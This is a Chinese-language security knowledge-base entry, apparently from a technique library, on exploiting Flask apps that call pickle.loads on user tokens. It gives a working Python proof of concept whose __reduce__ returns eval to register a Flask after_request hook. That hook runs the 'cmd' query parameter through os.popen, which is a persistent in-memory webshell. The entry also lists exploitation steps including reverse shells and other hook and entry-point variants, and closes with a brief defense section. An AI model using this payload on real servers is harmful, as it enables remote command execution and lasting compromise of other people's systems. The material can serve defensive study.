---
id: web-python-deserialization-flask-pickle-after-request-command-echo
title: Flask token pickle 反序列化：__reduce__ eval 注册 after_request 钩子实现命令回显
type: scenario
domain: web
path: web/python/deserialization
technique: flask-pickle-after-request-hook-command-echo
aliases:
- Flask pickle 反序列化
- after_request 钩子内存马
- pickle __reduce__ eval
- Flask token RCE
- pickle 命令回显
tags:
- python
- flask
- pickle
- deserialization
- rce
- after-request
- command-echo
- memshell
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V204
  verified_at: '2026-11-07T02:40:08+08:00'
  notes: 已对照原文与全部 89 张图片核对；pickle __reduce__/after_request 回显链一致；未在目标复现
---

## 一句话结论

Flask 应用把登录 token 当成 pickle 数据直接 `pickle.loads` 时，攻击者可以构造 `__reduce__` 返回 `eval`，在服务端执行 `current_app.after_request_funcs.setdefault(None, []).append(...)` 注册一个 after_request 钩子；该钩子从请求参数 `cmd` 取命令、用 `os.popen` 执行并把结果包装成响应，此后每次带 `?cmd=` 的请求都会得到命令输出。

## 原理

- `pickle.loads` 会执行对象 `__reduce__` 返回的可调用对象与参数；攻击者让 `__reduce__` 返回 `(eval, ("<python code>",))`，即可在反序列化时执行任意 Python 代码。
- Flask 的 `after_request_funcs` 是应用级钩子注册表：`current_app.after_request_funcs.setdefault(None, []).append(fn)` 注册的函数会在每个请求的响应返回前执行；它保存在应用对象中，跨请求持久。
- 钩子函数用 `flask.request.args.get('cmd')` 取命令，`os.popen(cmd).read()` 执行，并 `flask.make_response(...)` 返回；没有 `cmd` 时原样返回响应，避免影响正常页面。
- 由于钩子挂在应用对象而不是当前请求，攻击者只需要让 token 被反序列化一次（如登录/访问带 token 的接口），后续请求即可交互式执行命令。

## 触发条件

- 应用把用户可控的 token/cookie/参数直接交给 `pickle.loads`（常见于自定义会话、缓存、序列化 token）。
- Flask 应用对象可被 eval 代码访问（`flask.current_app`）。
- 攻击者能让该 token 进入反序列化路径至少一次。

## 利用步骤

1. 生成恶意 pickle：`__reduce__` 返回 `eval` 与注册 after_request 钩子的代码。
2. 对 payload 做十六进制/Base64/原样编码，按目标 token 格式提交。
3. 访问任意页面并带 `?cmd=id`，确认命令回显。
4. 用 `?cmd=` 执行任意命令、读取文件或反弹 shell。

## PoC

```python
import pickle

class RCE:
    def __reduce__(self):
        return (
            eval,
            ("""__import__('flask').current_app.after_request_funcs.setdefault(None, []).append(lambda r: __import__('flask').make_response(__import__('os').popen(__import__('flask').request.args.get('cmd')).read()) if __import__('flask').request.args.get('cmd') else r)""",)
        )

print(pickle.dumps(RCE(), protocol=4).hex())
```

提交后访问 `GET /?cmd=id` 即可看到命令输出。

## 变体与关联

- 钩子位置可换成 `before_request_funcs`、`template_context_processors`、`url_value_preprocessors` 等，形成不同触发时机的内存马。
- 反序列化入口可换成 Flask 缓存、签名 Cookie、Redis 会话；若存在签名校验，需要先泄露/爆破 secret。
- 关联：Bottle 签名 Cookie pickle RCE、RestrictedUnpickler 绕过、Flask SSTI 内存马。

## 检测与防御

- 永远不要 `pickle.loads` 不可信数据；token 使用签名（itsdangerous/JWT）并校验来源。
- 若必须反序列化，使用 `RestrictedUnpickler` 白名单类，禁止 `eval`/`exec`/`os` 等危险可调用对象。
- 监控 `after_request_funcs` 等 Flask 注册表的异常增长；定期重启并审计应用内存。
- 对 token 做完整性校验，避免客户端可控数据直接进入反序列化。
